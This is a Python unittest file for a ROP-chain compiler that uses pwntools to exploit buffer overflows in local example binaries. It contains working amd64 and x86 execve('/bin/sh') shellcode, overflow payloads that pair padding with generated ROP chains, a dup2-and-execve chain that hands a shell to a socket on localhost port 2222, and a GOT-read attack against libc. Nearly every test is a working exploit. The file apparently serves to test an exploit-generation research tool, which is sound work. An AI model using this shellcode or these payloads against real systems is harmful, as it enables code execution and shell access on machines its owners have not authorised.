import sys, logging, unittest, binascii
import archinfo
from pwn import *
import rop_compiler.ropme as ropme

class BofTests(unittest.TestCase):

  def random_string(self, n = 10):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(n))

  def shellcode_amd64(self):
    return ( # http://shell-storm.org/shellcode/files/shellcode-603.php
        "\x48\x31\xd2"                                  # xor    %rdx, %rdx
     +  "\x48\x31\xc0"                                  # xor    %rax, %rax
     +  "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      # mov  $0x68732f6e69622f2f, %rbx
     +  "\x48\xc1\xeb\x08"                              # shr    $0x8, %rbx
     +  "\x53"                                          # push   %rbx
     +  "\x48\x89\xe7"                                  # mov    %rsp, %rdi
     +  "\x50"                                          # push   %rax
     +  "\x57"                                          # push   %rdi
     +  "\x48\x89\xe6"                                  # mov    %rsp, %rsi
     +  "\xb0\x3b"                                      # mov    $0x3b, %al
     +  "\x0f\x05"                                      # syscall
    )

  def shellcode_x86(self):
    return ( # http://shell-storm.org/shellcode/files/shellcode-827.php
        "\x31\xc0"              # xor    eax,eax
     +  "\x50"                  # push   eax
     +  "\x68\x2f\x2f\x73\x68"  # push   0x68732f2f
     +  "\x68\x2f\x62\x69\x6e"  # push   0x6e69622f
     +  "\x89\xe3"              # mov    ebx,esp
     +  "\x50"                  # push   eax
     +  "\x53"                  # push   ebx
     +  "\x89\xe1"              # mov    ecx,esp
     +  "\x31\xd2"              # xor    edx,edx
     +  "\xb0\x0b"              # mov    al,0xb
     +  "\xcd\x80"              # int    0x80
    )

  def check_shell(self, p):
    input_str = self.random_string()
    p.writeline('echo ' + input_str)
    output_str = p.readline().strip()
    self.assertEqual(input_str, output_str)
    p.close()

  def test_bof(self):
    filename = '../example/bof'
    p = process([filename,'3000'])

    line = p.readline()
    buffer_address = int(line.split(":")[1],16)

    target_address = buffer_address + 1024
    rop = ropme.rop_to_shellcode([(filename, None, 0)], [], target_address, archinfo.ArchAMD64(), logging.DEBUG, True)
    payload = 'A'*512 + 'B'*8 + rop
    payload += ((1024 - len(payload)) * 'B') + self.shellcode_amd64()

    p.writeline(payload)
    self.check_shell(p)

  def test_bof_execve(self):
    filename = '../example/bof_execve'
    bof_execve = process([filename,'3000']) # start the program
    p = remote('localhost', 2222)

    files = [(filename, None, 0)]
    goals = [
      ["function", "dup2", 4, 0],
      ["function", "dup2", 4, 1],
      ["function", "dup2", 4, 2],
      ["execve", "/bin/sh"]
    ]

    rop = ropme.rop(files, [], goals, log_level = logging.DEBUG)
    payload = 'A'*512 + 'B'*8 + rop
    payload += ((700 - len(payload)) * 'B')
    payload += "JEFF" # To end our input

    p.write(payload)
    p.read(8)
    self.check_shell(p)
    bof_execve.close()

  def test_bof_many_args_x86(self):
    self.bof_many_args(False)

  def test_bof_many_args_amd64(self):
    self.bof_many_args(True)

  def bof_many_args(self, is_64bit):
    if is_64bit:
      filename, arch = '../example/bof_many_args', archinfo.ArchAMD64()
    else:
      filename, arch = '../example/bof_many_args_x86', archinfo.ArchX86()

    files = [(filename, None, 0)]
    rop = ropme.rop(files, [], [["function", "callme", 11,12,13,14,15,16,17,18]], arch = arch, log_level = logging.DEBUG)
    if is_64bit:
      payload = 'A'*512 + 'B'*8 + rop
    else:
      payload = 'A'*524 + 'B'*4 + rop
    p = process([filename,'3000'])
    p.writeline(payload)
    self.assertEqual('Called with (11,12,13,14,15,16,17,18)', p.readline().strip())
    p.close()

  def test_bof_shell(self):
    filename = '../example/bof_shell'

    files = [(filename, None, 0)]
    rop = ropme.rop(files, [], [["shellcode_hex", binascii.hexlify(self.shellcode_amd64())]], log_level = logging.DEBUG)
    payload = 'A'*512 + 'B'*8 + rop

    p = process([filename,'3000'])
    p.writeline(payload)
    p.readline()
    self.check_shell(p)

  def test_bof_system(self):
    filename = '../example/bof_system2'
    files = [(filename, None, 0)]
    rop = ropme.rop(files, [], [["function", "system", "uname -a\x00"], ["function", "exit", 33]], log_level = logging.DEBUG)
    payload = 'A'*512 + 'B'*8 + rop

    p = process([filename,'3000'])
    p.writeline(payload)
    actual = p.readline().strip()
    p.close()

    uname = process(['uname','-a'])
    expected = uname.readline().strip()
    uname.close()

    self.assertEqual(expected, actual)

  def test_bof_syscall(self):
    filename = '../example/bof_syscall'
    p = process([filename,'3000'])

    buffer_address = int(p.readline().split(":")[1],16)
    target_address = buffer_address + 1024

    rop = ropme.rop_to_shellcode([(filename, None, 0)], [], target_address)
    payload = 'A'*512 + 'B'*8 + rop
    payload += ((1024 - len(payload)) * 'B') + self.shellcode_amd64()

    p.writeline(payload)
    self.check_shell(p)

  def test_bof_read_got(self):
    self.do_test_bof_read_got('../example/bof_read_got')

  def test_bof_read_got2(self):
    self.do_test_bof_read_got('../example/bof_read_got2')

  def do_test_bof_read_got(self, filename):
    p = process([filename,'3000'])

    files = [(filename, None, 0)]
    rop = ropme.rop(files, ["/lib/x86_64-linux-gnu/libc.so.6"], [["shellcode_hex", binascii.hexlify(self.shellcode_amd64())]], log_level = logging.DEBUG)

    payload = 'A'*512 + ('B'*8) + rop
    p.writeline(payload)
    p.readline()
    self.check_shell(p)

  def test_bof_read_got_x86(self):
    filename = '../example/bof_read_got_x86'
    p = process([filename,'3000'])

    files = [(filename, None, 0)]
    rop = ropme.rop(files, ["/lib/i386-linux-gnu/libc.so.6"], [["shellcode_hex", binascii.hexlify(self.shellcode_x86())]], arch = archinfo.ArchX86(), log_level = logging.DEBUG)

    payload = 'A'*512 + ('B'*16) + rop
    p.writeline(payload)
    p.readline()
    self.check_shell(p)

if __name__ == '__main__':
  unittest.main()
